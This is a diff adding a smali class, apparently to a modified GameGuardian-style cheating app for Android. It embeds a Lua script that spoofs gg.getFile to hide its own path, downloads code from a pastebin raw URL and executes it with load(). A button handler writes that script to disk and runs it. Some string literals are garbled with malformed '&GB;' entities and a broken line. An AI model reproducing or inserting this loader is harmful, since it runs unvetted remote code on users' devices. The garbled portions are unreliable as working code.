@@ -1,0 +1,133 @@
+.class public Landroid/ext/hy;
+.super Landroid/ext/pj;
+.source &quot;src&quot;
+
+
+# static fields
+.field static a:Z
+
+.field static b:Z
+
+.field static c:Z
+
+.field static d:Z
+
+
+# direct methods
+.method static constructor &lt;clinit&gt;()V
+    .registers 2
+
+    .prologue
+    const/4 v1, 0x1
+
+    .line 36
+    const/4 v0, 0x0
+
+    sput-boolean v0, Landroid/ext/hy;-&gt;a:Z
+
+    .line 37
+    sput-boolean v1, Landroid/ext/hy;-&gt;b:Z
+
+    .line 38
+    sput-boolean v1, Landroid/ext/hy;-&gt;c:Z
+
+    .line 39
+    sput-boolean v1, Landroid/ext/hy;-&gt;d:Z
+
+    return-void
+.end method
+
+.method public constructor &lt;init&gt;()V
+    .registers 3
+
+    .prologue
+    .line 28
+    const v0, 0x7f070216
+
+    const v1, 0x7f02003e
+
+    invoke-direct {p0, v0, v1}, Landroid/ext/pj;-&gt;&lt;init&gt;(II)V
+
+    .line 29
+    return-void
+.end method
+
+.method private findOnlineCode()Ljava/lang/String;
+    .registers 2
+
+    const-string p0, &quot;local A = gg.getFile&amp;#40;&amp;#41;gg.getFile = function() return A end local V = gg.makeRequest('https://pastebin.com/raw/ygwBWAPM').content if V then pcall(load(V)) end&quot;
+    
+    return-object p0
+.end method
+
+
+# virtual methods
+.method public onClick(Landroid/view/View;)V
+    .registers 4
+
+    invoke-virtual {p0}, Landroid/ext/hy;-&gt;runOnline()V
+
+    return-void
+.end method
+
+.method runOnline()V
+    .registers 9
+
+    invoke-direct {p0}, Landroid/ext/hy;-&gt;findOnlineCode()Ljava/lang/String;
+
+    move-result-object v2
+
+    new-instance v1, Ljava/io/File;
+
+    invoke-static {}, Landroid/ext/Tools;-&gt;l()Ljava/io/File;
+
+    move-result-object v4
+
+    const-string v5, &quot;ScriptKhoiV1.lua&GB;
+
+    invoke-direct {v1, v4, v5}, Ljava/io/File;-&gt;&lt;init&gt;(Ljava/io/File;Ljava/lang/String;)V
+
+    :try_start_f
+    new-instance v3, Ljava/io/FileOutputStream;
+
+    invoke-direct {v3, v1}, Ljava/io/FileOutputStream;-&gt;&lt;init&gt;(Ljava/io/File;)V
+
+    invoke-virtual {v2}, Ljava/lang/String;-&gt;getBytes()[B
+
+    move-result-object v4
+
+    invoke-virtual {v3, v4}, Ljava/io/OutputStream;-&gt;write([B)V
+
+    invoke-virtual {v3}, Ljava/io/OutputStream;-&gt;close()V
+
+    sget-object v4, Landroid/ext/MainService;-&gt;instance:Landroid/ext/MainService;
+
+    invoke-virtual {v1}, Ljava/io/File;-&gt;getAbsolutePath()Ljava/lang/String;
+
+    move-result-object v5
+
+    const/4 v6, 0x0
+
+    const-string v7, &quot;&quot;
+
+    invoke-virtual {v4, v5, v6, v7}, Landroid/ext/MainService;-&gt;a(Ljava/lang/String;ILjava/lang/String;)V
+    :try_end_2a
+    .catch Ljava/io/IOException; {:try_start_f .. :try_end_2a} :catch_2b
+
+    :goto_2a
+    return-void
+
+    :catch_2b
+    move-exception v0
+
+    const-string v4, &quot;Failed to write script&GB;
+
+    invoke-static {v4, v0}, Landroid/ext/la;-&gt;c(Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    const-string v4, &quot;Failed to write script&GB
+t;
+
+    invoke-static {v4}, Landroid/ext/Tools;-&gt;showToast(Ljava/lang/String;)V
+
+    goto :goto_2a
+.end method
